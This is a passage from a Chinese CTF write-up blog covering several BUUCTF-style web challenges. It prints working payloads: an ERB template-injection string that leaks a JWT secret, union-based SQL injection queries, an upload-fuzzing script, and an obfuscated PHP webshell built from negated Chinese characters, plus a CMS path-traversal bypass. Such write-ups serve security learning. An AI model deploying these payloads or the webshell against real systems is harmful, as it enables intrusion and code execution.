class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">FLAGPRICE</span> = <span class="number">1000000000000000000000000000</span></span><br><span class="line"><span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = <span class="title class_">File</span>.new(File.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb <span class="variable constant_">IO</span>.binread <span class="variable constant_">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.encode payload,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; <span class="variable constant_">FLAGPRICE</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">islogin</span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>可以审计一下源码分析一下大致逻辑<br>首先漏洞点出在&#x2F;work路由上</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br></pre></td></tr></table></figure>
<p>这一段代码最后用ERB模板去渲染了输出结果,我就寻思为啥要用个sinatra框架（喜欢用一些这种东西，些许不适）<br>然后紧接着就是如何用这里的SSTI去获取我们的SECRETKEY去伪造jwt，这里又要介绍一下Ruby的预定义字符了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672316590573-1636675b-6e95-46ed-9e38-ff84851c6a75.png" alt="image.png"><br>今天的主角是<code>$&#39;</code>,他可以用来获取匹配选中部分之后的字符串<br><code>if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;</code><br>前面我们对SECRET和我们传入的参数<code>SECRET</code>进行了匹配，假如我们传入<code>SECRET</code>为空，那匹配之后的部分不就是KEY值吗，所以构造payload如下<br><code>/work?name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working&amp;SECRET=</code>，其中URL编码部分为<code>&lt;%=$&#39;%&gt;</code><br>SSTI部分请参考：<br>至此可以获取到key：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672316758145-88a487b6-6fc0-45ed-be26-eb7c0f0f9459.png" alt="image.png"><br>之后拿获取到的key去构造jwt：<br>然后去flag界面获取得到的auth<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672316802660-57417a18-3756-4db3-acdb-653cc4a58ab8.png" alt="image.png"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth &lt;&lt; &#123;<span class="symbol">flag:</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>从这段代码可以看到把flag放到了cookie中的auth里，我们反向解密一下就好了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672316848618-15c79afb-448b-47f2-94ff-0639ee4c8442.png" alt="image.png"></p>
<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>考点：二次注入<br>杂碎题,第一次居然没写出来，我是傻逼啊我草</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#x&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="comment">#asdasdasdasdasdasdsdddddddsadasdasdsadasdasdasdasdxzczsadasda</span></span><br><span class="line"><span class="comment">#flag,news,users</span></span><br><span class="line"><span class="comment">#x&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="comment">#x&#x27; union select flag from flag#</span></span><br></pre></td></tr></table></figure>
<p>用户名处二次注入，真的狗屎，就是个联合注入，我还想着跑脚本呢，结果设置了访问时间间隔，搞得我以为有长度限制，你妈的</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>考点：文件上传+中文命令执行<br>这一题的原型其实也就是一个类似自增来达到命令执行目的的题目，披了个文件上传的皮<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672398185061-ac1f589a-9d8a-4db0-b212-bc58a2a85e7f.png" alt="image.png"><br>首先给了我们过滤的逻辑，会判断上传文件的内容，从第五个字符后开始判断，第六个字符开始不能出现黑名单内的词汇，因此这里就得做一个fuzz</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://50bb3407-a3d6-4e7f-a476-b1eea0ba60ad.node4.buuoj.cn:81/index.php?act=upload&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">    string=<span class="built_in">chr</span>(i)</span><br><span class="line">    file_content=<span class="string">&#x27;11111&#x27;</span>+string</span><br><span class="line">    file=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>, file_content, <span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,files=file)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment"># print(str)</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Stored&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符可用:&quot;</span>+string+<span class="string">&quot;Ascii:&quot;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">当前字符可用:Ascii:1</span><br><span class="line">当前字符可用:Ascii:2</span><br><span class="line">当前字符可用:Ascii:3</span><br><span class="line">当前字符可用:Ascii:4</span><br><span class="line">当前字符可用:Ascii:5</span><br><span class="line">当前字符可用:Ascii:6</span><br><span class="line">当前字符可用:Ascii:7</span><br><span class="line">当前字符可用Ascii:8</span><br><span class="line">当前字符可用:	Ascii:9</span><br><span class="line">当前字符可用:</span><br><span class="line">Ascii:10</span><br><span class="line">当前字符可用:Ascii:11</span><br><span class="line">当前字符可用:Ascii:12</span><br><span class="line">Ascii:13</span><br><span class="line">当前字符可用:Ascii:14</span><br><span class="line">当前字符可用:Ascii:15</span><br><span class="line">当前字符可用:Ascii:16</span><br><span class="line">当前字符可用:Ascii:17</span><br><span class="line">当前字符可用:Ascii:18</span><br><span class="line">当前字符可用:Ascii:19</span><br><span class="line">当前字符可用:Ascii:20</span><br><span class="line">当前字符可用:Ascii:21</span><br><span class="line">当前字符可用:Ascii:22</span><br><span class="line">当前字符可用:Ascii:23</span><br><span class="line">当前字符可用:Ascii:24</span><br><span class="line">当前字符可用:Ascii:25</span><br><span class="line">当前字符可用:Ascii:26</span><br><span class="line">当前字符可用:Ascii:27</span><br><span class="line">当前字符可用:Ascii:28</span><br><span class="line">当前字符可用:Ascii:29</span><br><span class="line">当前字符可用:Ascii:30</span><br><span class="line">当前字符可用:Ascii:31</span><br><span class="line">当前字符可用:$Ascii:36</span><br><span class="line">当前字符可用:(Ascii:40</span><br><span class="line">当前字符可用:)Ascii:41</span><br><span class="line">当前字符可用:.Ascii:46</span><br><span class="line">当前字符可用:;Ascii:59</span><br><span class="line">当前字符可用:=Ascii:61</span><br><span class="line">当前字符可用:[Ascii:91</span><br><span class="line">当前字符可用:]Ascii:93</span><br><span class="line">当前字符可用:_Ascii:95</span><br><span class="line">当前字符可用:~Ascii:126</span><br><span class="line">当前字符可用:Ascii:127</span><br></pre></td></tr></table></figure>
<p>得出的结果如上，可以发现留给我们的可用字符有<code>$ ( ) . ; = [ ] _ ~</code>，以及经过测试，<strong>中文汉字也可以</strong>，<strong>以及回车和换行</strong>，由此可以发现是不是和自增有点像了·<br>接下来的流程就很清晰，利用取反中文来获取有用的英文字母，写个PHP脚本进行：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//Author:Boogipop</span></span><br><span class="line">$poem=<span class="string">&quot;妾发初覆额折花门前剧郎骑竹马来，绕床弄青梅同居长干里两小无嫌猜十四为君妇羞颜未尝开低头向暗壁唤不一十五始展眉愿同尘与灰常存抱柱信岂上望夫台十六君远行瞿塘滟滪堆五月不可触，猿声天上哀。门前迟行迹一生绿苔。苔深不能扫落叶秋风早八月胡蝶来双飞西园草感此伤妾心坐愁红颜老早晚下三巴预将书报家相迎不道远直至长风沙&quot;</span>;</span><br><span class="line">$arr=preg_split(<span class="string">&#x27;//u&#x27;</span>,$poem);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">fuzz</span><span class="params">($array)</span>&#123;</span><br><span class="line">    $list=[];</span><br><span class="line">    $len=count($array);</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;$len-<span class="number">1</span>;$i++)&#123;</span><br><span class="line">        $list[$array[$i]]=~$array[$i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $list;</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">search</span><span class="params">($word,$list)</span>&#123;</span><br><span class="line">    $key_res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($word);$i++)&#123;</span><br><span class="line">        $key=array_search($word[$i],$list);</span><br><span class="line">        $key_res.=<span class="string">&quot;~&quot;</span>.$key.<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $res=$word.<span class="string">&quot; : &quot;</span>.$key_res;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">$dict=fuzz($arr);</span><br><span class="line">echo <span class="title function_">search</span><span class="params">(<span class="string">&quot;eval&quot;</span>,$dict)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672649475661-b7a9d20f-eafa-4b2d-bc4c-44c0bf648d01.png" alt="image.png"><br>没咋写过php脚本，无语…..<br>接下来就可以构造我们上传文件的内容了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_==_);</span><br><span class="line"><span class="variable">$__</span>=~(瞿);</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(猜);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(猜);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(暗);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(十);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(苔);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(识);</span><br><span class="line"><span class="variable">$_____</span>=<span class="variable">$____</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(水);</span><br><span class="line"><span class="variable">$_____</span>.=<span class="variable">$____</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(欣);</span><br><span class="line"><span class="variable">$_____</span>.=<span class="variable">$____</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(竹);</span><br><span class="line"><span class="variable">$_____</span>.=<span class="variable">$____</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_____</span>=_.<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$__</span>[<span class="variable">$_</span>]);</span><br></pre></td></tr></table></figure>
<p>最后也是在系统环境变量<code>env</code>中获取flag:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672652532555-d724128d-100c-4b8f-af07-ce6f6bcd17ea.png" alt="image.png"><br>PS:老子蚁剑坏了</p>
<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>考点:SQL UNION注入<br>很蠢的一道题<br><code>[http://73553657-7a5d-49d1-93ef-cb2b8b01e624.node4.buuoj.cn/query?search=chryse_planitia%20union%20select%201,group_concat(id,code)%20from%20alien_code.code](http://73553657-7a5d-49d1-93ef-cb2b8b01e624.node4.buuoj.cn/query?search=chryse_planitia%20union%20select%201,group_concat(id,code)%20from%20alien_code.code)</code></p>
<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>考点:CMS<br>这题感jio不错，虽然没做出来，但是还是发现，假如做cms的题目，没给你源码，那你就自己去下，然后在本地调试一下，cms的题还是比较难QWQ<br>通过这一题我居然把GKCTF 2021所有web题学习了一波QWQ：<br>进入正题吧：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672737962521-bbf60ab5-3b97-49a5-a6e9-d9cf10e88045.png" alt="image.png"><br>首先就是admin.php管理员界面泄露，密码就是12345，题目中提示了，进入这里找到了第一个可疑getshell的点:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738010876-9b127719-9d36-479e-96f1-b74c7c08c6fe.png" alt="image.png"><br>幻灯片界面，点进去编辑可以发现，php代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738032075-f9ef3e4c-c845-42e8-91ce-4cea0720d01d.png" alt="image.png"><br>但是无法提交，显示错误：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738379387-19b5fc1a-b576-473b-a35a-649f35d48df1.png" alt="image.png"><br>他有一个文件验证，现在我们没有这个文件，所以无法更改，因此只能想办法看看在哪儿可以去生成这个文件，网上去找找源码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738441950-f3c5d4a9-e19e-4bfd-bf25-9a305ea5595f.png" alt="image.png"><br>是通过<code>file_exists</code>去检测的，可以用文件或者文件夹去绕过，然后在生成微信接口的界面发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738489556-dd7b8175-d192-4784-aa4c-213d8993849c.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738431696-68f021d0-142d-4fdd-a058-d0119e018bcb.png" alt="image.png"><br>存在一个<code>mkdir</code>函数，而且<code>account</code>的值就是原始ID,因此存在一个目录穿越<br>我们创建一个原始ID为<code>../../../system/tmp/itja.txt/1</code>的公众号即可，这样的话就可以生成itja.txt目录，从而绕过file_exists:(在这之前记得县创建一个正常的接口，否则无法正常执行):<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738825083-d5576512-8204-498f-bf22-9d5b38b03a30.png" alt="image.png"><br>更改成功后直接在首页可以得到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738845657-15dc7c6b-5a5f-4009-b49d-b4f1861b632b.png" alt="image.png"><br>还有另外一种getshell的方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672738869711-e2a892a6-887b-47fe-ac3a-4877b1e021c3.png" alt="image.png"><br>高级界面内也可以去设置内容</p>
<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>考点:信息泄露、PHP伪随机数、SQL注入？<br>首先存在<a target="_blank" rel="noopener" href="http://www.zip泄露/">www.zip泄露</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 